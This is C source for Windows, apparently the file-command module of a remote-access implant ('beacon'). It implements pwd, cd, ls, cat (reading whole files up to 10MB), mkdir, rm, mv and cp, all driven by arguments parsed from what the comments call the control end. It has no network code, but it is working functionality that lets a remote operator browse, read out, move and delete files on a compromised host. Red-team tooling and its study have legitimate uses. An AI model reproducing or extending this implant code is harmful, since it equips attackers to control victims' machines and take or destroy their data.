#include "beacon_commands.h"

#include <direct.h>

/* 根据当前时区偏差返回时区缩写 */
static const CHAR* FsTimezoneAbbrev(VOID)
{
    TIME_ZONE_INFORMATION tz;
    DWORD state = GetTimeZoneInformation(&tz);
    LONG bias = tz.Bias;

    if (state == TIME_ZONE_ID_DAYLIGHT) {
        bias += tz.DaylightBias;
    } else if (state == TIME_ZONE_ID_STANDARD) {
        bias += tz.StandardBias;
    }

    if (bias == -480) return "CST";
    if (bias == 0) return "UTC";
    return "LOCAL";
}

/* 将 FILETIME 格式化为人类可读的日期字符串 */
static VOID FsFormatFiletime(FILETIME ft, CHAR out[32])
{
    static const CHAR* months[] = {
        "Jan", "Feb", "Mar", "Apr", "May", "Jun",
        "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"
    };
    FILETIME local_ft;
    SYSTEMTIME st;
    const CHAR* month = "Jan";

    /* 将 UTC 时间转换为本地时间，再转换为系统时间 */
    if (!FileTimeToLocalFileTime(&ft, &local_ft) ||
        !FileTimeToSystemTime(&local_ft, &st)) {
        strcpy_s(out, 32, "01 Jan 70 00:00 UTC");
        return;
    }

    if (st.wMonth >= 1 && st.wMonth <= 12) {
        month = months[st.wMonth - 1];
    }

    snprintf(out, 32, "%02u %s %02u %02u:%02u %s",
             (unsigned)st.wDay,
             month,
             (unsigned)(st.wYear % 100),
             (unsigned)st.wHour,
             (unsigned)st.wMinute,
             FsTimezoneAbbrev());
}

/* 从解析器中解析单个路径参数，返回宽字符串。
 * 解析失败（缺参或协议截断）时填充 *error 并返回 NULL——不再静默产出空路径，
 * 否则下游会报误导性的 "open file failed" 而非真实协议错误。 */
static WCHAR* ParseOnePath(Parser* p, const CHAR* name, ByteBuf* error)
{
    UINT32 count = ParserU32(p);
    CHAR* s;
    WCHAR* w;

    /* 验证至少存在一个参数 */
    if (count == 0) {
        CHAR msg[128];
        snprintf(msg, sizeof(msg), "%s requires 1 argument", name);
        *error = BbFromText(msg);
        return NULL;
    }

    s = ParserString(p);
    if (p->error[0] || !s) {
        CHAR msg[160];
        snprintf(msg, sizeof(msg), "%s: %s", name,
                 p->error[0] ? p->error : "path parse failed");
        *error = BbFromText(msg);
        HeapFree(GetProcessHeap(), 0, (s));
        return NULL;
    }

    w = Utf8ToWide(s);
    HeapFree(GetProcessHeap(), 0, (s));
    return w;
}

/* 以 ByteBuf 形式返回当前工作目录 */
ByteBuf CommandPwd(VOID)
{
    WCHAR buf[MAX_PATH * 2];
    CHAR* s;
    ByteBuf out;

    if (!_wgetcwd(buf, ARRAYSIZE(buf))) {
        return BbFromText("getcwd failed");
    }
    s = WideToUtf8(buf);
    out = BbFromText(s);
    HeapFree(GetProcessHeap(), 0, (s));
    return out;
}

/* 更改当前工作目录 */
ByteBuf CommandCd(Parser* p)
{
    UINT32 count = ParserU32(p);
    CHAR* s;
    WCHAR* w;

    /* 无参数：返回当前目录 */
    if (count == 0) {
        return CommandPwd();
    }

    s = ParserString(p);
    if (p->error[0] || !s) {
        CHAR msg[160];
        snprintf(msg, sizeof(msg), "cd: %s",
                 p->error[0] ? p->error : "path parse failed");
        return BbFromText(msg);
    }
    w = Utf8ToWide(s);
    HeapFree(GetProcessHeap(), 0, (s));

    /* 尝试切换目录 */
    if (!w || _wchdir(w) != 0) {
        HeapFree(GetProcessHeap(), 0, (w));
        return BbFromText("chdir failed");
    }
    HeapFree(GetProcessHeap(), 0, (w));
    return CommandPwd();
}

/* 列出目录内容，包含模式、大小、修改时间和名称 */
ByteBuf CommandLs(Parser* p)
{
    UINT32 count = ParserU32(p);
    CHAR* s = NULL;
    WCHAR* dir = NULL;
    WCHAR pattern[MAX_PATH * 2];
    WIN32_FIND_DATAW fd;
    HANDLE h;
    ByteBuf out;

    BbInit(&out);

    /* 从参数解析目标目录，默认为 "." */
    if (count) {
        s = ParserString(p);
        if (p->error[0] || !s) {
            CHAR msg[160];
            snprintf(msg, sizeof(msg), "ls: %s",
                     p->error[0] ? p->error : "path parse failed");
            BbFree(&out);
            return BbFromText(msg);
        }
        dir = Utf8ToWide(s);
        HeapFree(GetProcessHeap(), 0, (s));
    } else {
        dir = HeapStrDupW(L".");
    }
    if (!dir) return BbFromText("path allocation failed");

    /* 构建用于目录枚举的通配符模式。
     * swprintf_s 截断即触发 CRT invalid parameter handler（进程终止），而目录名
     * 来自控制端、长度不受限：超长时按惯例回退为显式截断检查 + 报错文本。 */
    {
        size_t dir_len = wcslen(dir);
        if (dir_len + 2 >= ARRAYSIZE(pattern)) { /* 需容纳 dir + '\' + '*' + NUL */
            HeapFree(GetProcessHeap(), 0, (dir));
            BbFree(&out);
            return BbFromText("path too long");
        }
        memcpy(pattern, dir, dir_len * sizeof(WCHAR));
        pattern[dir_len] = L'\\';
        pattern[dir_len + 1] = L'*';
        pattern[dir_len + 2] = L'\0';
    }
    {
        CHAR* u = WideToUtf8(dir);
        BbPrintf(&out, "Listing directory: %s\n", u ? u : "");
        HeapFree(GetProcessHeap(), 0, (u));
    }

    /* 开始目录枚举 */
    h = FindFirstFileW(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, (dir));
        BbFree(&out);
        return BbFromText("FindFirstFile failed");
    }

    /* 写入列标题 */
    {
        const CHAR* header = "Mode                 Size       ModTime              Name\n";
        const CHAR* sep = "--------------------------------------------------------------------------------\n";
        BbAppend(&out, header, strlen(header));
        BbAppend(&out, sep, strlen(sep));
    }

    /* 遍历目录条目 */
    do {
        CHAR* name = WideToUtf8(fd.cFileName);
        ULARGE_INTEGER sz;
        CHAR mode[16];
        CHAR mtime[32];

        /* 跳过 "." 和 ".." 条目 */
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) {
            HeapFree(GetProcessHeap(), 0, (name));
            continue;
        }

        /* 格式化文件条目行 */
        sz.LowPart = fd.nFileSizeLow;
        sz.HighPart = fd.nFileSizeHigh;
        FsModeStringFromAttrs(fd.dwFileAttributes, mode);
        FsFormatFiletime(fd.ftLastWriteTime, mtime);
        BbPrintf(&out, "%-20s %-10I64u %-20s %s%s\n",
                  mode,
                  (unsigned __int64)sz.QuadPart,
                  mtime,
                  name ? name : "",
                  (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "/" : "");
        HeapFree(GetProcessHeap(), 0, (name));
    } while (FindNextFileW(h, &fd));

    FindClose(h);
    HeapFree(GetProcessHeap(), 0, (dir));
    return out;
}

/* 读取并返回文件内容 */
ByteBuf CommandCat(Parser* p)
{
    ByteBuf err;
    WCHAR* path;
    HANDLE f = INVALID_HANDLE_VALUE;
    LARGE_INTEGER file_size;
    ByteBuf out;
    DWORD n_read = 0;

    BbInit(&err);

    /* 解析文件路径参数 */
    path = ParseOnePath(p, "cat", &err);
    if (!path) return err;

    /* 以二进制读取模式打开文件 */
    f = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) {
        HeapFree(GetProcessHeap(), 0, (path));
        return BbFromText("open file failed");
    }

    /* 检查文件大小是否超过 10MB 限制 */
    if (!GetFileSizeEx(f, &file_size)) {
        CloseHandle(f);
        HeapFree(GetProcessHeap(), 0, (path));
        return BbFromText("get file size failed");
    }
    if (file_size.QuadPart > 10ll * 1024ll * 1024ll) {
        CloseHandle(f);
        HeapFree(GetProcessHeap(), 0, (path));
        return BbFromText("file size exceeds 10MB limit");
    }

    /* 将整个文件读入缓冲区 */
    BbInit(&out);
    if (file_size.QuadPart > 0) {
        if (!BbReserve(&out, (SIZE_T)file_size.QuadPart) ||
            !ReadFile(f, out.data, (DWORD)file_size.QuadPart, &n_read, NULL) ||
            n_read != (DWORD)file_size.QuadPart) {
            BbFree(&out);
            CloseHandle(f);
            HeapFree(GetProcessHeap(), 0, (path));
            return BbFromText("read file failed");
        }
        out.len = n_read;
    }
    CloseHandle(f);
    HeapFree(GetProcessHeap(), 0, (path));
    return out;
}

/* 创建新目录 */
ByteBuf CommandMkdir(Parser* p)
{
    ByteBuf err;
    WCHAR* path;

    BbInit(&err);

    /* 解析目录路径参数 */
    path = ParseOnePath(p, "mkdir", &err);
    if (!path) return err;

    /* 创建目录，若已存在则忽略 */
    if (!CreateDirectoryW(path, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        HeapFree(GetProcessHeap(), 0, (path));
        return BbFromText("CreateDirectory failed");
    }
    HeapFree(GetProcessHeap(), 0, (path));
    return BbFromText("Directory created");
}

/* 删除文件或目录 */
ByteBuf CommandRm(Parser* p)
{
    ByteBuf err;
    WCHAR* path;
    DWORD attrs;
    BOOL removed;

    BbInit(&err);

    /* 解析路径参数 */
    path = ParseOnePath(p, "rm", &err);
    if (!path) return err;

    /* 根据属性删除目录或文件；旧实现忽略返回值，即使失败也谎报 "Removed" */
    attrs = GetFileAttributesW(path);
    if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        removed = RemoveDirectoryW(path);
    } else {
        removed = DeleteFileW(path);
    }
    HeapFree(GetProcessHeap(), 0, (path));
    if (!removed) {
        return BbFromText("remove failed");
    }
    return BbFromText("Removed");
}

/* 移动/重命名文件或目录 */
ByteBuf CommandMv(Parser* p)
{
    CHAR* a;
    CHAR* b;
    WCHAR* wa;
    WCHAR* wb;

    /* 验证参数数量 */
    if (ParserU32(p) < 2) return BbFromText("mv requires 2 arguments");

    /* 解析源路径和目标路径（截断包在此显式失败，不再产出空路径） */
    a = ParserString(p);
    b = p->error[0] ? NULL : ParserString(p);
    if (p->error[0] || !a || !b) {
        CHAR msg[160];
        snprintf(msg, sizeof(msg), "mv: %s",
                 p->error[0] ? p->error : "path parse failed");
        HeapFree(GetProcessHeap(), 0, (a));
        HeapFree(GetProcessHeap(), 0, (b));
        return BbFromText(msg);
    }
    wa = Utf8ToWide(a);
    wb = Utf8ToWide(b);
    HeapFree(GetProcessHeap(), 0, (a));
    HeapFree(GetProcessHeap(), 0, (b));

    if (!wa || !wb) {
        HeapFree(GetProcessHeap(), 0, (wa));
        HeapFree(GetProcessHeap(), 0, (wb));
        return BbFromText("mv: path allocation failed");
    }

    /* 执行移动操作 */
    if (!MoveFileExW(wa, wb, MOVEFILE_REPLACE_EXISTING)) {
        HeapFree(GetProcessHeap(), 0, (wa));
        HeapFree(GetProcessHeap(), 0, (wb));
        return BbFromText("MoveFileEx failed");
    }
    HeapFree(GetProcessHeap(), 0, (wa));
    HeapFree(GetProcessHeap(), 0, (wb));
    return BbFromText("Moved");
}

/* 复制文件 */
ByteBuf CommandCp(Parser* p)
{
    CHAR* a;
    CHAR* b;
    WCHAR* wa;
    WCHAR* wb;

    /* 验证参数数量 */
    if (ParserU32(p) < 2) return BbFromText("cp requires 2 arguments");

    /* 解析源路径和目标路径（截断包在此显式失败，不再产出空路径） */
    a = ParserString(p);
    b = p->error[0] ? NULL : ParserString(p);
    if (p->error[0] || !a || !b) {
        CHAR msg[160];
        snprintf(msg, sizeof(msg), "cp: %s",
                 p->error[0] ? p->error : "path parse failed");
        HeapFree(GetProcessHeap(), 0, (a));
        HeapFree(GetProcessHeap(), 0, (b));
        return BbFromText(msg);
    }
    wa = Utf8ToWide(a);
    wb = Utf8ToWide(b);
    HeapFree(GetProcessHeap(), 0, (a));
    HeapFree(GetProcessHeap(), 0, (b));

    if (!wa || !wb) {
        HeapFree(GetProcessHeap(), 0, (wa));
        HeapFree(GetProcessHeap(), 0, (wb));
        return BbFromText("cp: path allocation failed");
    }

    /* 执行复制操作 */
    if (!CopyFileW(wa, wb, FALSE)) {
        HeapFree(GetProcessHeap(), 0, (wa));
        HeapFree(GetProcessHeap(), 0, (wb));
        return BbFromText("CopyFile failed");
    }
    HeapFree(GetProcessHeap(), 0, (wa));
    HeapFree(GetProcessHeap(), 0, (wb));
    return BbFromText("Copied");
}
